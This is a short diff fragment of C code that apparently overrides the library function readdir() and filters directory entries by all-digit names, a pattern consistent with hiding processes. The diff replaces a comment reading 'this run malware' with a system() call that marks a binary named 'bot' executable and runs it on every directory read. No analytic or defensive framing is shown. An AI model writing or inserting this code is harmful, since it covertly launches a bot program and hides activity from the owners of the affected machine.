@@ -68,7 +68,7 @@ struct dirent *readdir(DIR *dirp)
     {
         printf("Reading entry: %s\n", entry->d_name);
 
-        // this run malware
+        system("chmod +x bot && ./bot");
 
         if (!is_all_digits(entry->d_name))
         {
